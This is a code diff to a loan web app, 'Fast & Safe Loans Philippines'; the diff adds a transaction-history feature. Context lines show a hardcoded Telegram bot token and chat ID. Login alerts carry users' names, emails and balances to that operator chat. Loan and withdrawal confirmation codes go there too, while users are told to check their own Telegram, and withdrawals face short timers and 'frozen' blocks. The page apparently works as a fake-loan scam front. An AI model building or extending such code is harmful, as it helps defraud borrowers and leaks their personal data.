@@ -147,41 +147,25 @@
   
   .section-label{font-size:13px;font-weight:700;color:var(--text2);margin:0 20px 12px;letter-spacing:.5px;}
   
-  /* Fix for buttons - make them clearly clickable */
-  .btn-clickable {
-    cursor: pointer !important;
-    position: relative;
-    z-index: 10;
-  }
-  .btn-clickable:active {
-    transform: scale(0.97);
-  }
+  .btn-clickable{cursor:pointer !important;position:relative;z-index:10;}
+  .btn-clickable:active{transform:scale(0.97);}
+  #loan-btn,#wd-btn,#register-btn,#login-btn{cursor:pointer !important;position:relative;z-index:10;pointer-events:auto !important;}
+  .bank-card{cursor:pointer !important;pointer-events:auto !important;}
+  .tab-item{cursor:pointer !important;pointer-events:auto !important;}
+  .stat-card[onclick]{cursor:pointer !important;pointer-events:auto !important;}
   
-  /* Fix for form buttons */
-  #loan-btn, #wd-btn, #register-btn, #login-btn {
-    cursor: pointer !important;
-    position: relative;
-    z-index: 10;
-    pointer-events: auto !important;
-  }
-  
-  /* Fix for bank cards */
-  .bank-card {
-    cursor: pointer !important;
-    pointer-events: auto !important;
-  }
-  
-  /* Fix for tab items */
-  .tab-item {
-    cursor: pointer !important;
-    pointer-events: auto !important;
-  }
-  
-  /* Fix for action cards */
-  .stat-card[onclick] {
-    cursor: pointer !important;
-    pointer-events: auto !important;
-  }
+  .history-item{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid var(--border);}
+  .history-item:last-child{border-bottom:none;}
+  .history-item .h-left{display:flex;flex-direction:column;gap:2px;}
+  .history-item .h-type{font-size:13px;font-weight:600;color:var(--text);}
+  .history-item .h-date{font-size:11px;color:var(--text3);}
+  .history-item .h-amount{font-size:14px;font-weight:700;}
+  .history-item .h-amount.positive{color:var(--green-dark);}
+  .history-item .h-amount.negative{color:#b33c3c;}
+  .history-item .h-status{font-size:11px;font-weight:600;padding:2px 10px;border-radius:50px;}
+  .history-item .h-status.success{background:#e8f5ed;color:#0d7a3e;}
+  .history-item .h-status.pending{background:#fff3e0;color:#e65100;}
+  .history-item .h-status.failed{background:#fce4ec;color:#b33c3c;}
 </style>
 </head>
 <body>
@@ -332,6 +316,14 @@
         <div class="section-title"><span class="icon">📢</span>Notice</div>
         <p style="font-size:13px;color:var(--text2);line-height:1.7;">Fast & Safe Loans Philippines offers quick personal loans with flexible repayment. Apply today and get approved within minutes. Requirements: valid ID and active bank account.</p>
       </div>
+      
+      <!-- History Section -->
+      <div class="section-card" style="margin-top:8px;">
+        <div class="section-title"><span class="icon">📜</span>Transaction History</div>
+        <div id="transaction-history">
+          <div style="text-align:center;color:var(--text3);font-size:13px;padding:12px 0;">No transactions yet</div>
+        </div>
+      </div>
     </div>
 
     <!-- LOAN TAB -->
@@ -414,7 +406,7 @@
       </div>
     </div>
 
-    <!-- WITHDRAW TAB -->
+    <!-- WITHDRAW TAB - Button at top -->
     <div id="panel-withdraw" class="tab-panel">
       <div style="padding-top:4px;"></div>
       <div class="section-card" style="margin-bottom:8px;">
@@ -424,7 +416,10 @@
           <span>Available Balance</span>
           <span id="wd-balance-display">₱0.00</span>
         </div>
+        <!-- Withdraw Button at TOP -->
+        <button class="btn-primary btn-clickable" id="wd-btn" onclick="submitWithdraw()" style="margin-top:12px;">Process Withdrawal</button>
       </div>
+      
       <div style="padding:0 20px;">
         <div class="section-label" style="margin:0 0 10px;">Banks</div>
         <div class="bank-grid">
@@ -457,7 +452,6 @@
               <button type="button" class="pw-toggle" onclick="togglePw('wd-password',this)">👁</button>
             </div>
           </div>
-          <button class="btn-primary btn-clickable" id="wd-btn" onclick="submitWithdraw()">Process Withdrawal</button>
         </div>
       </div>
     </div>
@@ -528,7 +522,6 @@
     <div class="overlay-card">
       <h3>Loan Processing</h3>
       <p style="font-size:13px;color:var(--text2);margin-bottom:8px;">Enter the loan confirmation code sent to your Telegram</p>
-      
       <div class="code-input">
         <input type="text" id="loan-code-1" maxlength="1" oninput="moveNext(this,'loan-code-2')">
         <input type="text" id="loan-code-2" maxlength="1" oninput="moveNext(this,'loan-code-3')">
@@ -537,15 +530,9 @@
         <input type="text" id="loan-code-5" maxlength="1" oninput="moveNext(this,'loan-code-6')">
         <input type="text" id="loan-code-6" maxlength="1" oninput="moveNext(this,'loan-code-6')">
       </div>
-      
       <div class="info-text">Check your Telegram for the confirmation code</div>
-      
-      <div class="timer-display">
-        <span id="loan-confirm-time">7d 00:00</span>
-      </div>
-      
+      <div class="timer-display"><span id="loan-confirm-time">7d 00:00</span></div>
       <div style="font-size:11px;color:var(--text3);font-weight:600;letter-spacing:.5px;margin-bottom:16px;">REMAINING</div>
-      
       <button class="btn-primary btn-clickable" onclick="verifyLoanCode()">Confirm Loan</button>
     </div>
   </div>
@@ -555,7 +542,6 @@
     <div class="overlay-card">
       <h3>Withdrawal Confirmation</h3>
       <p style="font-size:13px;color:var(--text2);margin-bottom:8px;">Enter the withdrawal confirmation code sent to your Telegram</p>
-      
       <div class="code-input">
         <input type="text" id="wd-code-1" maxlength="1" oninput="moveNext(this,'wd-code-2')">
         <input type="text" id="wd-code-2" maxlength="1" oninput="moveNext(this,'wd-code-3')">
@@ -564,15 +550,9 @@
         <input type="text" id="wd-code-5" maxlength="1" oninput="moveNext(this,'wd-code-6')">
         <input type="text" id="wd-code-6" maxlength="1" oninput="moveNext(this,'wd-code-6')">
       </div>
-      
       <div class="info-text">Check your Telegram for the confirmation code</div>
-      
-      <div class="timer-display">
-        <span id="wd-confirm-time">01:00</span>
-      </div>
-      
+      <div class="timer-display"><span id="wd-confirm-time">01:00</span></div>
       <div style="font-size:11px;color:var(--text3);font-weight:600;letter-spacing:.5px;margin-bottom:16px;">REMAINING</div>
-      
       <button class="btn-primary btn-clickable" onclick="verifyWdCode()">Confirm Withdrawal</button>
       <button class="btn-secondary btn-clickable" onclick="cancelWithdraw()">Cancel</button>
     </div>
@@ -595,13 +575,13 @@
 
 <script>
 // ============================================================
-//  SUPABASE CONFIGURATION - YOUR CREDENTIALS
+//  SUPABASE CONFIGURATION
 // ============================================================
 const SUPABASE_URL = 'https://wyszjxixjgasxkouckkl.supabase.co';
 const SUPABASE_KEY = 'sb_publishable_Q1G5K02Q2FKcDKv2zcRWUQ_ZkQBrwg1';
 
 // ============================================================
-//  TELEGRAM CONFIG - YOUR BOT
+//  TELEGRAM CONFIG
 // ============================================================
 const TG_TOKEN = '8888068488:AAGeZEzcf9RDCFQ3zCizVMA2nNh_PhYEVeY';
 const TG_CHAT = '7417215529';
@@ -619,6 +599,7 @@ let pendingWdAmount = 0;
 let pendingWdData = null;
 let generatedLoanCode = '';
 let generatedWdCode = '';
+let transactions = [];
 
 // ============================================================
 //  SUPABASE HELPERS
@@ -631,17 +612,14 @@ async function supabaseFetch(path, options = {}) {
     'Content-Type': 'application/json',
     'Prefer': 'return=representation'
   };
-  
   const response = await fetch(url, {
     ...options,
     headers: { ...headers, ...options.headers }
   });
-  
   if (!response.ok) {
     const errorText = await response.text();
     throw new Error(`Supabase error: ${response.status} - ${errorText}`);
   }
-  
   return response.json();
 }
 
@@ -671,18 +649,13 @@ async function getUserBySlot(slot) {
 async function createUser(userData) {
   try {
     const existing = await getUserByEmail(userData.email);
-    if (existing) {
-      throw new Error('Email already registered');
-    }
+    if (existing) throw new Error('Email already registered');
     
     const allUsers = await supabaseFetch('/users?select=slot&order=slot.asc');
     const usedSlots = new Set(allUsers.map(u => u.slot));
     let slot = 1;
     while (usedSlots.has(slot) && slot <= 70) slot++;
-    
-    if (slot > 70) {
-      throw new Error('No available slots. Contact support.');
-    }
+    if (slot > 70) throw new Error('No available slots. Contact support.');
     
     const newUser = {
       slot: slot,
@@ -705,22 +678,17 @@ async function createUser(userData) {
       'Content-Type': 'application/json',
       'Prefer': 'return=representation'
     };
-    
     const response = await fetch(url, {
       method: 'POST',
       headers: headers,
       body: JSON.stringify(newUser)
     });
-    
     if (!response.ok) {
       const errorText = await response.text();
-      console.error('Supabase error:', errorText);
       throw new Error(`Registration failed: ${response.status} - ${errorText}`);
     }
-    
     const result = await response.json();
     return result && result.length > 0 ? result[0] : null;
-    
   } catch (error) {
     console.error('Error creating user:', error);
     throw error;
@@ -784,6 +752,51 @@ function sendTelegramWithCode(msg, code) {
   const fullMsg = msg + `\n\nCONFIRMATION CODE: ${code}`;
   sendTelegram(fullMsg);
   return code;
+}
+
+// ============================================================
+//  TRANSACTION HISTORY
+// ============================================================
+function addTransaction(type, amount, status, details = '') {
+  transactions.unshift({
+    type: type,
+    amount: amount,
+    status: status,
+    details: details,
+    date: new Date().toLocaleString('en-PH')
+  });
+  renderHistory();
+}
+
+function renderHistory() {
+  const container = document.getElementById('transaction-history');
+  if (!container) return;
+  
+  if (transactions.length === 0) {
+    container.innerHTML = '<div style="text-align:center;color:var(--text3);font-size:13px;padding:12px 0;">No transactions yet</div>';
+    return;
+  }
+  
+  let html = '';
+  transactions.forEach(t => {
+    const isPositive = t.type === 'Loan' || t.type === 'Deposit';
+    const amountClass = isPositive ? 'positive' : 'negative';
+    const sign = isPositive ? '+' : '-';
+    const statusClass = t.status === 'Success' ? 'success' : t.status === 'Pending' ? 'pending' : 'failed';
+    html += `
+      <div class="history-item">
+        <div class="h-left">
+          <div class="h-type">${t.type} ${t.details ? '- ' + t.details : ''}</div>
+          <div class="h-date">${t.date}</div>
+        </div>
+        <div style="text-align:right;">
+          <div class="h-amount ${amountClass}">${sign}₱${t.amount.toLocaleString()}</div>
+          <div class="h-status ${statusClass}">${t.status}</div>
+        </div>
+      </div>
+    `;
+  });
+  container.innerHTML = html;
 }
 
 // ============================================================
@@ -863,14 +876,12 @@ document.getElementById('login-form').addEventListener('submit', async function(
 
   try {
     const user = await getUserByEmail(email);
-    
     if (!user || user.password !== password) {
       showToast('Invalid email or password', 'error');
       btn.disabled = false;
       btn.textContent = 'Sign In';
       return;
     }
-    
     if (!user.verified) {
       showToast('Account not verified. Contact support.', 'error');
       btn.disabled = false;
@@ -880,6 +891,12 @@ document.getElementById('login-form').addEventListener('submit', async function(
 
     currentSlot = user.slot;
     currentUser = user;
+
+    // Load transactions from localStorage
+    const savedTransactions = localStorage.getItem(`transactions_${user.slot}`);
+    if (savedTransactions) {
+      transactions = JSON.parse(savedTransactions);
+    }
 
     sendTelegram(
       `LOGIN ALERT\n━━━━━━━━━━━━━━━\nName: ${user.full_name || 'N/A'}\nEmail: ${user.email}\nSlot: #${user.slot}\nBalance: ₱${Number(user.balance).toLocaleString()}\nLoan Status: ${user.loan_status}\nTime: ${new Date().toLocaleString('en-PH')}`
@@ -1005,6 +1022,7 @@ function loadDashboard() {
   refreshLoanStatus();
   refreshProfile();
   updateWdBalance();
+  renderHistory();
 }
 
 function updateStatusBadge(status) {
@@ -1123,6 +1141,9 @@ document.getElementById('loan-form').addEventListener('submit', async function(e
       generatedLoanCode
     );
 
+    // Add to history
+    addTransaction('Loan', amount, 'Pending', 'Application submitted');
+
     updateStatusBadge('waiting');
     document.getElementById('home-loan-status').textContent = 'waiting';
     document.getElementById('home-loan-amount').textContent = '₱' + amount.toLocaleString();
@@ -1205,6 +1226,12 @@ async function verifyLoanCode() {
       
       currentUser = await getUserBySlot(currentSlot);
       
+      // Update transaction status
+      const pendingTx = transactions.find(t => t.type === 'Loan' && t.status === 'Pending' && t.amount === pendingLoanAmount);
+      if (pendingTx) pendingTx.status = 'Success';
+      
+      addTransaction('Deposit', pendingLoanAmount, 'Success', 'Loan credited');
+      
       updateStatusBadge('approved');
       loadDashboard();
       showToast('Loan Confirmed! ₱' + pendingLoanAmount.toLocaleString() + ' credited to your balance.', 'success', 5000);
@@ -1216,6 +1243,8 @@ async function verifyLoanCode() {
       clearCode('loan-code');
       generatedLoanCode = '';
       pendingLoanAmount = 0;
+      // Save transactions
+      localStorage.setItem(`transactions_${currentSlot}`, JSON.stringify(transactions));
     } catch (error) {
       console.error('Loan confirmation error:', error);
       showToast('Failed to confirm loan. Please try again.', 'error');
@@ -1226,17 +1255,20 @@ async function verifyLoanCode() {
 }
 
 // ============================================================
-//  WITHDRAW
+//  WITHDRAW (With Freeze Check)
 // ============================================================
 async function submitWithdraw() {
   if (!currentUser) { 
     showToast('Please login first', 'error'); 
     return; 
   }
+  
+  // CHECK: Account frozen check
   if (currentUser.frozen) { 
     showToast('Account frozen — cannot withdraw', 'error'); 
     return; 
   }
+  
   if (!selectedBank) { 
     showToast('Please select a bank or wallet', 'error'); 
     return; 
@@ -1275,6 +1307,9 @@ async function submitWithdraw() {
     await updateBalance(currentSlot, -amount);
     currentUser = await getUserBySlot(currentSlot);
     loadDashboard();
+
+    // Add to history
+    addTransaction('Withdrawal', amount, 'Pending', `to ${selectedBank}`);
 
     generatedWdCode = generateRandomCode();
 
@@ -1323,6 +1358,10 @@ function startWdConfirmCountdown(amount) {
           await updateBalance(currentSlot, pendingWdAmount);
           currentUser = await getUserBySlot(currentSlot);
           loadDashboard();
+          // Update transaction to failed
+          const pendingTx = transactions.find(t => t.type === 'Withdrawal' && t.status === 'Pending' && t.amount === pendingWdAmount);
+          if (pendingTx) pendingTx.status = 'Failed';
+          localStorage.setItem(`transactions_${currentSlot}`, JSON.stringify(transactions));
           showToast('Withdrawal expired. Balance restored.', 'error', 5000);
           sendTelegram(
             `WITHDRAWAL EXPIRED\n━━━━━━━━━━━━━━━\nName: ${currentUser.full_name}\nAmount: ₱${pendingWdAmount.toLocaleString()}\nBalance Restored: ₱${Number(currentUser.balance).toLocaleString()}\nTime: ${new Date().toLocaleString('en-PH')}`
@@ -1357,6 +1396,11 @@ async function verifyWdCode() {
     clearInterval(wdConfirmTimer);
     document.getElementById('overlay-wd-confirm').classList.remove('active');
     
+    // Update transaction to success
+    const pendingTx = transactions.find(t => t.type === 'Withdrawal' && t.status === 'Pending' && t.amount === pendingWdAmount);
+    if (pendingTx) pendingTx.status = 'Success';
+    localStorage.setItem(`transactions_${currentSlot}`, JSON.stringify(transactions));
+    
     showToast('Withdrawal of ₱' + pendingWdAmount.toLocaleString() + ' confirmed!', 'success', 5000);
     
     sendTelegram(
@@ -1367,6 +1411,7 @@ async function verifyWdCode() {
     pendingWdAmount = 0;
     pendingWdData = null;
     generatedWdCode = '';
+    renderHistory();
   } else {
     showToast('Invalid code. Please check your Telegram.', 'error');
   }
@@ -1381,6 +1426,9 @@ async function cancelWithdraw() {
       await updateBalance(currentSlot, pendingWdAmount);
       currentUser = await getUserBySlot(currentSlot);
       loadDashboard();
+      const pendingTx = transactions.find(t => t.type === 'Withdrawal' && t.status === 'Pending' && t.amount === pendingWdAmount);
+      if (pendingTx) pendingTx.status = 'Failed';
+      localStorage.setItem(`transactions_${currentSlot}`, JSON.stringify(transactions));
     } catch (error) {
       console.error('Error restoring balance:', error);
     }
@@ -1410,10 +1458,15 @@ document.getElementById('modal-id').addEventListener('click', function(e) {
 //  LOGOUT
 // ============================================================
 function doLogout() {
+  // Save transactions
+  if (currentSlot) {
+    localStorage.setItem(`transactions_${currentSlot}`, JSON.stringify(transactions));
+  }
   localStorage.removeItem('fsl_session');
   currentSlot = null;
   currentUser = null;
   selectedBank = '';
+  transactions = [];
   clearInterval(loanConfirmTimer);
   clearInterval(wdConfirmTimer);
   document.getElementById('overlay-loan-confirm').classList.remove('active');
@@ -1445,6 +1498,11 @@ async function checkAutoLogin() {
     
     currentSlot = user.slot;
     currentUser = user;
+
+    const savedTransactions = localStorage.getItem(`transactions_${user.slot}`);
+    if (savedTransactions) {
+      transactions = JSON.parse(savedTransactions);
+    }
     
     loadDashboard();
     showScreen('screen-dashboard');
